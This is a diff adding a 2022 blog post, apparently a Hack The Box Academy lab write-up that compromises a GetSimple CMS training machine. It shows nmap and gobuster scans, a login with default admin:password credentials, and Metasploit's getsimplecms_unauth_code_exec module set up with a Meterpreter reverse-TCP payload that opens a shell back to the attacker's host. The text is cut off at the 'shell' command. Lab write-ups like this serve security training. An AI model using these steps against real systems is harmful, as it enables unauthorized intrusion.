@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="twitter:card" content="summary_large_image" /><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Write Up for HacktheBox - Getting Started (Academy Module) | SlyDaw</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="Write Up for HacktheBox - Getting Started (Academy Module)" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Solving HackTheBox - Getting Started CTF." />
+<meta property="og:description" content="Solving HackTheBox - Getting Started CTF." />
+<link rel="canonical" href="https://slydaw.github.io/CTF-Writeups-and-Blogs/cybersecurity/2022/06/10/GettingStarted.html" />
+<meta property="og:url" content="https://slydaw.github.io/CTF-Writeups-and-Blogs/cybersecurity/2022/06/10/GettingStarted.html" />
+<meta property="og:site_name" content="SlyDaw" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-06-10T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Write Up for HacktheBox - Getting Started (Academy Module)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-10T00:00:00-05:00","datePublished":"2022-06-10T00:00:00-05:00","description":"Solving HackTheBox - Getting Started CTF.","headline":"Write Up for HacktheBox - Getting Started (Academy Module)","mainEntityOfPage":{"@type":"WebPage","@id":"https://slydaw.github.io/CTF-Writeups-and-Blogs/cybersecurity/2022/06/10/GettingStarted.html"},"url":"https://slydaw.github.io/CTF-Writeups-and-Blogs/cybersecurity/2022/06/10/GettingStarted.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/CTF-Writeups-and-Blogs/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="https://slydaw.github.io/CTF-Writeups-and-Blogs/feed.xml" title="SlyDaw" /><link rel="shortcut icon" type="image/x-icon" href="/CTF-Writeups-and-Blogs/images/favicon.ico"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Primer/15.2.0/primer.css" integrity="sha512-xTz2ys4coGAOz8vuV1NcQBkgVmKhsSEtjbqyMJbBHRplFuvKIUo6xhLHpAyPt9mfR6twHJgn9OgVLuqOvjeBhg==" crossorigin="anonymous" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha512-1PKOgIY59xJ8Co8+NE6FZ+LOAZKjy+KY8iq0G4B3CyeY6wYHN3yt9PW0XpSriVlkMXe40PTKnXrLnZ9+fkDaog==" crossorigin="anonymous" />
+
+<script>
+function wrap_img(fn) {
+    if (document.attachEvent ? document.readyState === "complete" : document.readyState !== "loading") {
+        var elements = document.querySelectorAll(".post img");
+        Array.prototype.forEach.call(elements, function(el, i) {
+            if (el.getAttribute("title") && (el.className != "emoji")) {
+                const caption = document.createElement('figcaption');
+                var node = document.createTextNode(el.getAttribute("title"));
+                caption.appendChild(node);
+                const wrapper = document.createElement('figure');
+                wrapper.className = 'image';
+                el.parentNode.insertBefore(wrapper, el);
+                el.parentNode.removeChild(el);
+                wrapper.appendChild(el);
+                wrapper.appendChild(caption);
+            }
+        });
+    } else { document.addEventListener('DOMContentLoaded', fn); }
+}
+window.onload = wrap_img;
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function(){
+    // add link icon to anchor tags
+    var elem = document.querySelectorAll(".anchor-link")
+    elem.forEach(e => (e.innerHTML = '<i class="fas fa-link fa-xs"></i>'));
+    });
+</script>
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/CTF-Writeups-and-Blogs/">SlyDaw</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/CTF-Writeups-and-Blogs/about/">About Me</a><a class="page-link" href="/CTF-Writeups-and-Blogs/search/">Search</a><a class="page-link" href="/CTF-Writeups-and-Blogs/categories/">Tags</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Write Up for HacktheBox - Getting Started (Academy Module)</h1><p class="page-description">Solving HackTheBox - Getting Started CTF.</p><p class="post-meta post-meta-title"><time class="dt-published" datetime="2022-06-10T00:00:00-05:00" itemprop="datePublished">
+        Jun 10, 2022
+      </time>
+       • <span class="read-time" title="Estimated read time">
+    
+    
+      12 min read
+    
+</span></p>
+
+    
+      <p class="category-tags"><i class="fas fa-tags category-tags-icon"></i></i> 
+      
+        <a class="category-tags-link" href="/CTF-Writeups-and-Blogs/categories/#Cybersecurity">Cybersecurity</a>
+        
+      
+      </p>
+    
+
+    </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h1"><a href="#htb---getting-started-academy-module">HTB - Getting Started (Academy Module)</a>
+<ul>
+<li class="toc-entry toc-h6"><a href="#contains-spoilers">Contains Spoilers</a></li>
+<li class="toc-entry toc-h2"><a href="#nmap-scan">nmap scan</a></li>
+<li class="toc-entry toc-h2"><a href="#enumerating-the-web-server">Enumerating the Web Server</a></li>
+<li class="toc-entry toc-h2"><a href="#gobuster-scan">Gobuster Scan</a></li>
+<li class="toc-entry toc-h2"><a href="#using-the-getsimplecms-exploit">Using the GetSimpleCMS Exploit</a></li>
+<li class="toc-entry toc-h2"><a href="#post-exploitation---finding-the-usertxt-flag">Post Exploitation - Finding the user.txt flag</a></li>
+</ul>
+</li>
+</ul><h1 id="htb---getting-started-academy-module">
+<a class="anchor" href="#htb---getting-started-academy-module" aria-hidden="true"><span class="octicon octicon-link"></span></a>HTB - Getting Started (Academy Module)</h1>
+<h6 id="contains-spoilers">
+<a class="anchor" href="#contains-spoilers" aria-hidden="true"><span class="octicon octicon-link"></span></a><em>Contains Spoilers</em>
+</h6>
+<h2 id="nmap-scan">
+<a class="anchor" href="#nmap-scan" aria-hidden="true"><span class="octicon octicon-link"></span></a>nmap scan</h2>
+<p>Machine IP: 10.129.42.249</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; sudo nmap -sV -sC -O 10.129.42.249</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-06-10 10:46 PDT
+Nmap scan report <span class="k">for </span>10.129.42.249
+Host is up <span class="o">(</span>0.078s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 4c:73:a0:25:f5:fe:81:7b:82:2b:36:49:a5:4d:c8:5e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e1:c0:56:d0:52:04:2f:3c:ac:9a:e7:b1:79:2b:bb:13 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 52:31:47:14:0d:c3:8e:15:73:e3:c4:24:a2:3a:12:77 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: Welcome to GetSimple! - gettingstarted
+| http-robots.txt: 1 disallowed entry 
+|_/admin/
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.92%E<span class="o">=</span>4%D<span class="o">=</span>6/10%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>34221%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>I%G<span class="o">=</span>Y%TM<span class="o">=</span>62A3839
+OS:D%P<span class="o">=</span>aarch64-unknown-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>FE%GCD<span class="o">=</span>1%ISR<span class="o">=</span>103%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>
+OS:A<span class="o">)</span>OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M505ST11NW7%O2<span class="o">=</span>M505ST11NW7%O3<span class="o">=</span>M505NNT11NW7%O4<span class="o">=</span>M505ST11NW7%O5<span class="o">=</span>M5
+OS:05ST11NW7%O6<span class="o">=</span>M505ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FE88%W2<span class="o">=</span>FE88%W3<span class="o">=</span>FE88%W4<span class="o">=</span>FE88%W5<span class="o">=</span>FE88%W6<span class="o">=</span>FE8
+OS:8<span class="o">)</span>ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>FAF0%O<span class="o">=</span>M505NNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S
+OS:+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=</span>
+OS:<span class="o">)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%
+OS:A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%
+OS:DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>
+OS:40%CD<span class="o">=</span>S<span class="o">)</span>
+
+Network Distance: 2 hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.74 seconds
+</code></pre></div></div>
+<p>We notice that there are 2 open ports: port 80 is running a web server and port 22 is running OpenSSH. Lets continue with navigating to the web server, since that may provide us with a larger attack surface.</p>
+
+<h2 id="enumerating-the-web-server">
+<a class="anchor" href="#enumerating-the-web-server" aria-hidden="true"><span class="octicon octicon-link"></span></a>Enumerating the Web Server</h2>
+<p>First, directly navigate to the server IP from your browser.</p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173172867-f073801b-dbe6-4b68-9b36-bea1b4c13152.png" alt="Pasted image 20220610105623">
+As we can see, there is a raw GetSimple website that looks like it hasn’t been configured yet. Let’s note that <strong>GetSimple</strong> is in use, in case we look to exploit this service later.</p>
+
+<p>Now, let’s hit  <code class="language-plaintext highlighter-rouge">CTRL + U</code>  to see some of the website’s source code and see if we find anything interesting there.</p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173039-17a31611-2150-40ab-9813-2043d4570efc.png" alt="Pasted image 20220610110216">
+It’s important to look at things like comments (shown in green) in the html source code with hopes of obtaining useful information or references to undiscovered directories.</p>
+
+<p>While we read the source code, we can run a <strong>Gobuster</strong> scan to look for potential directories on the web server.</p>
+<h2 id="gobuster-scan">
+<a class="anchor" href="#gobuster-scan" aria-hidden="true"><span class="octicon octicon-link"></span></a>Gobuster Scan</h2>
+<p><code class="language-plaintext highlighter-rouge">&gt; gobuster -u 10.129.42.249 dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3- medium.txt -t50
+</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.129.42.249
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 50
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2022/06/10 11:12:48 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/data                 <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.42.249/data/]
+/admin                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.42.249/admin/]
+/plugins              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.42.249/plugins/]
+/theme                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.42.249/theme/]  
+/backups              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 316] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.42.249/backups/]
+/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 278]                                    
+                                                                                   
+<span class="o">===============================================================</span>
+2022/06/10 11:18:56 Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+<p>When getting several hits like these, it is important to navigate to the web pages and not omit any of the directories as they may contain useful information.</p>
+
+<p>Reading the html source code didn’t alert us of anything signficant.
+Therefore, lets navigate to our first directory hit:  <code class="language-plaintext highlighter-rouge">10.129.42.249/data/</code></p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173049-d273c8fc-f218-4822-8687-51d8a4d1273b.png" alt="Pasted image 20220610112230">
+As we can see, we have some folders with files in them. You should be going through all of these folders one by one and checking the files for any valuable information and noting them.</p>
+
+<p>Upon going to the <strong>users</strong> folder, we are met with a .xml file named <strong>admin</strong>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173060-f31b8767-b7bb-4459-9b09-32b649f1f3ac.png" alt="Pasted image 20220610112522"> So it looks like there may be a user named <strong>admin</strong>. Credentials are great to have so lets note that username down in our notes.  We also have a password string so let’s write that down as well.</p>
+
+<p>If we look back at our gobuster scan, we’ll notice the <strong>admin</strong> directory. Let’s navigate there to see what we may find. ## Admin Portal Enumeration
+Let’s navigate to <code class="language-plaintext highlighter-rouge">10.129.42.249/admin/</code></p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173072-e2e4c243-51a8-4bdb-afd7-2796d508ecfc.png" alt="Pasted image 20220610113352">
+Looks like we are met with a login page. We noted the credentials we obtained from browsing the web server directories , so lets try signing in with <strong>admin</strong> as the username and the string  <code class="language-plaintext highlighter-rouge">d033e22ae348aeb5660fc2140aec35850c4da997</code> as the password.</p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173079-1c3ee337-2946-4e63-9d02-77a6b21e19d3.png" alt="Pasted image 20220610113647">
+As shown by the error, the login failed and our credentials are wrong. The password string may be encoded text or , after all, may not even be related to the admin password.</p>
+
+<p>Since there is a good chance our username is correct, lets try some common passwords that <strong>admins</strong> may use or leave unchanged before approaching other options, like bruteforcing or cracking the hash. Some examples of common passwords are <em>password, admin, password123</em>, etc.</p>
+
+<p>After attempting these common passwords, the credentials <strong>admin:password</strong> seem to log us in.</p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173088-1b7fa3c0-f865-4542-b9b5-b175068cc8f1.png" alt="Pasted image 20220610121249">
+Let’s navigate through all of the dashboard tabs and look for some goodies, like information on running services, file uploads, etc.</p>
+
+<p>If we head over to the files tab, it looks like we are given an option to <code class="language-plaintext highlighter-rouge">upload a file</code>.</p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173091-58215928-727b-4bce-aa6a-d4353e795f46.png" alt="Pasted image 20220610121812">
+This could give us some attack vectors, such as <strong>RCE</strong> (Remot Code Execution) or some kind of <strong>code injection</strong>. However, when clicking on the upload files option, it seems that we aren’t able to exercise the feature for whatever reason.</p>
+
+<p>Let’s put this aside for now instead of attempting to troubleshoot and could always come back to it later in case we don’t find anything else.</p>
+
+<p>The <strong>support tab</strong> in the top right has a notification and looks navigation-worthy. Let’s head on there.</p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173098-feae66ae-03bb-47c4-9f4b-08ab17f0afd7.png" alt="Pasted image 20220610122335">
+Bingo! It looks like we are met with some great information: the running services and their version numbers. It is fundamental sysadmin practice to keep all running services up to date to avoid any attackers exploiting unpatched vulnerabilities within these services. It looks like this admin had all of his services up to date…except the <strong>GetSimple</strong> service.</p>
+
+<p>This provides us with a new attack vector and is worth diving into in order to gain a foothold on our machine. ## Finding an exploit for GetSimple 3.3.15
+For this instance, I will use the Metasploit Framework and other CVE databases if needed.</p>
+
+<p>Let’s first search for a Metasploit module that works against our version of <strong>GetSimple</strong>. If we are unable to find a working module in Metasploit , we will move on to CVE databases such as Rapid7 and ExploitDB to look further.</p>
+
+<p>Lets open our metasploit console.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; msfconsole</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>To use retry middleware with Faraday v2.0+, <span class="nb">install</span> <span class="sb">`</span>faraday-retry<span class="sb">`</span> gem
+                                                  
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        <span class="o">(</span><span class="sb">`</span><span class="nb">.</span>         ,-,
+                        <span class="sb">`</span> <span class="sb">`</span><span class="nb">.</span>    ,<span class="p">;</span><span class="s1">' /
+                         `.  ,'</span>/ .<span class="s1">'
+                          `. X /.'</span>
+                .-<span class="p">;</span><span class="nt">--</span><span class="s1">''</span><span class="nt">--</span>.._<span class="sb">`</span> <span class="sb">`</span> <span class="o">(</span>
+              .<span class="s1">'            /   `
+             ,           ` '</span>   Q <span class="s1">'
+             ,         ,   `._    \
+          ,.|         '</span>     <span class="sb">`</span>-.<span class="p">;</span>_<span class="s1">'
+          :  . `  ;    `  ` --,.._;
+           '</span> <span class="sb">`</span>    ,   <span class="o">)</span>   .<span class="s1">'
+              `._ ,  '</span>   /_
+                 <span class="p">;</span> ,<span class="s1">''</span>-,<span class="p">;</span><span class="s1">' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+       =[ metasploit v6.2.1-dev                           ]
++ -- --=[ 2225 exploits - 1171 auxiliary - 398 post       ]
++ -- --=[ 864 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Adapter names can be used for IP params 
+set LHOST eth0
+
+</span></code></pre></div></div>
+
+<p>Now lets search for our service and its version to see if there are any modules for it.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; search GetSimple 3.3.15</code></p>
+
+<p><img src="https://user-images.githubusercontent.com/90112418/173173105-f4d59e0d-c255-4988-a06e-fc6c9ab3545e.png" alt="Pasted image 20220610124530">
+Like Tinder, it’s a match. We should now select this module which , according to the description, would allow for <strong>RCE</strong>.</p>
+
+<p>To use the module , we simply run the <code class="language-plaintext highlighter-rouge">use</code> command alongside the the module #.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; use 0</code></p>
+
+<p>Now that we have selected the module, let’s run a command to show us which options and settings we need to configure in order for it to do its thing.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; show options</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Module options <span class="o">(</span>exploit/multi/http/getsimplecms_unauth_code_exec<span class="o">)</span>:
+
+   Name       Current Setting  Required  Description
+   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+   RHOSTS                      <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SSL        <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
+   TARGETURI  /                <span class="nb">yes       </span>The base path to the cms
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options <span class="o">(</span>php/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  10.211.55.14     <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   GetSimpleCMS 3.3.15 and before
+
+</code></pre></div></div>
+<p>It looks like we are required to set the <em>RHOSTS, RPORT, TARGETURI,</em> and <em>LHOST</em> options. We can also see on the bottom that this module works with <code class="language-plaintext highlighter-rouge">GetSimpleCMS 3.3.15 and before</code>.</p>
+
+<p>RHOSTS is our target IP address, so lets begin by setting that.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; set RHOSTS 10.129.42.249 </code></p>
+
+<p>Next, RPORT is our targets port. Since our nmap scan told us that the web server was running on port 80, there is no need to change this as it’s already set by default.</p>
+
+<p>The TARGETURI option dictates under which path the service operates. In our case, it is in the base path of <code class="language-plaintext highlighter-rouge">/</code> and therefore does not need to be changed either.</p>
+
+<p>The LHOST option is our host’s NIC (network interface card) address. Since we are connected using the HacktheBox VPN, it will most likely be under the tun0 interface. We can check our tun0 IP address by typing the following command in a new terminal on our host.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; ip a</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    <span class="nb">link</span>/none 
+    inet 10.10.14.115/23 scope global tun0
+</code></pre></div></div>
+<p>The <code class="language-plaintext highlighter-rouge">inet</code> address up until the <code class="language-plaintext highlighter-rouge">/</code> will be our NIC address and should therefore be set with the following command.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; set LHOST 10.10.14.115</code></p>
+
+<p>You can also simply specify your interface name like tun0, eth0, etc instead of your IP address.</p>
+
+<p>As you may figure, LPORT is the port on our host that’s to be used. We can usually leave this on the default option so let’s leave it on <code class="language-plaintext highlighter-rouge">4444</code>.</p>
+
+<p>If we do the following command again, we will see that our settings have all been changed to our desired options.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; show options</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Module options <span class="o">(</span>exploit/multi/http/getsimplecms_unauth_code_exec<span class="o">)</span>:                                                                                    
+                                                                                                                                                      
+   Name       Current Setting  Required  Description                                                                                                  
+   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>                                                                                                  
+   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]                                                 
+   RHOSTS     10.129.42.249    <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit                 
+   RPORT      80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>                                                                                        
+   SSL        <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections                                                                   
+   TARGETURI  /                <span class="nb">yes       </span>The base path to the cms                                                                                     
+   VHOST                       no        HTTP server virtual host                                                                                     
+                                                                                                                                                      
+                                                                                                                                                      
+Payload options <span class="o">(</span>php/meterpreter/reverse_tcp<span class="o">)</span>:                                                                                                        
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  10.10.14.115     <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   GetSimpleCMS 3.3.15 and before
+
+</code></pre></div></div>
+<p>Everything looks good to go, so lets move on to the moment we’ve <strong>ALL</strong> been waiting for: using the exploit.</p>
+<h2 id="using-the-getsimplecms-exploit">
+<a class="anchor" href="#using-the-getsimplecms-exploit" aria-hidden="true"><span class="octicon octicon-link"></span></a>Using the GetSimpleCMS Exploit</h2>
+<p>Before running the exploit, we should run the following command to ensure that our exploit works against the machine.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; check</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] 10.129.42.249 - The target is vulnerable.
+</code></pre></div></div>
+<p>Perfect! Our machine seems to be vulnerable</p>
+
+<p>Keep in mind that not all metasploit modules support the <code class="language-plaintext highlighter-rouge">check</code> feature , but it is always a nice thing to have.</p>
+
+<p>Now that we are all set, let’s hit the big red button by typing</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; run</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.115:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>39860 bytes<span class="o">)</span> to 10.129.42.249
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.115:4444 -&gt; 10.129.42.249:53132<span class="o">)</span> at 2022-06-10 17:52:12 <span class="nt">-0700</span>
+
+meterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+<p>Great, we now have a meterpreter shell on the machine and can execute commands.</p>
+
+<p>Let’s move on to our post exploitation procedure.</p>
+<h2 id="post-exploitation---finding-the-usertxt-flag">
+<a class="anchor" href="#post-exploitation---finding-the-usertxt-flag" aria-hidden="true"><span class="octicon octicon-link"></span></a>Post Exploitation - Finding the user.txt flag</h2>
+<p>After gaining a foothold, we are asked to find and submit the contents of <strong>user.txt</strong> as a flag.</p>
+
+<p>Now that we have a meterpreter shell in the machine, lets type the following command to drop into a system command shell.</p>
+
+<p><code class="language-plaintext highlighter-rouge">&gt; shell</code></p>
+
